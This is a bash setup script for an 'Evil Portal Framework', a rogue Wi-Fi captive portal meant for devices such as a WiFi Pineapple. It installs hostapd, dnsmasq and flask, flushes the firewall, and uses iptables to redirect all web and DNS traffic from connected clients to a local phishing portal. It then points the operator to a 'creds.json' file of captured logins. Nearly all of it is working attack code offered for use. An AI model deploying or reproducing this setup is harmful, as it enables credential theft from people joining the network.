#!/bin/bash
# Evil Portal Framework v2 - Universal Setup
# Compatible with WiFi Pineapple, Raspberry Pi, Kali Linux

set -e
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'

echo -e "${GREEN}[*] Evil Portal Framework v2${NC}"
if [ "$EUID" -ne 0 ]; then echo -e "${RED}[!] Run as root${NC}"; exit 1; fi

IFACE=${1:-wlan0}
GATEWAY=${2:-192.168.1.1}
PROFILE=${3:-default}

echo -e "${YELLOW}[*] Config: IFACE=$IFACE GW=$GATEWAY PROFILE=$PROFILE${NC}"

echo -e "${GREEN}[*] Installing deps...${NC}"
if command -v apt-get &> /dev/null; then
    apt-get update -qq && apt-get install -y -qq python3 python3-pip iptables dnsmasq hostapd 2>/dev/null || true
elif command -v opkg &> /dev/null; then
    opkg update && opkg install python3 python3-pip iptables dnsmasq hostapd 2>/dev/null || true
fi
pip3 install flask 2>/dev/null || pip install flask

echo -e "${GREEN}[*] Configuring iptables...${NC}"
iptables -F 2>/dev/null; iptables -t nat -F 2>/dev/null
iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 80 -j DNAT --to-destination $GATEWAY:80
iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 443 -j DNAT --to-destination $GATEWAY:80
iptables -t nat -A PREROUTING -i $IFACE -p udp --dport 53 -j DNAT --to-destination $GATEWAY:53
iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT

echo -e "${GREEN}[*] Starting portal (profile: $PROFILE)...${NC}"
fuser -k 80/tcp 2>/dev/null || true
python3 portal.py --host 0.0.0.0 --port 80 --interface $IFACE &
PORTAL_PID=$!

echo ""
echo -e "${GREEN}[+] Portal running!${NC}"
echo -e "${YELLOW}    PID: $PORTAL_PID${NC}"
echo -e "${YELLOW}    URL: http://$GATEWAY/?profile=$PROFILE${NC}"
echo -e "${GREEN}[*] Logs: tail -f access.log${NC}"
echo -e "${GREEN}[*] Creds: cat creds.json${NC}"
echo ""

trap "echo ''; echo -e '${RED}[!] Stopping...${NC}'; kill $PORTAL_PID 2>/dev/null; iptables -F; iptables -t nat -F; exit 0" INT
wait $PORTAL_PID
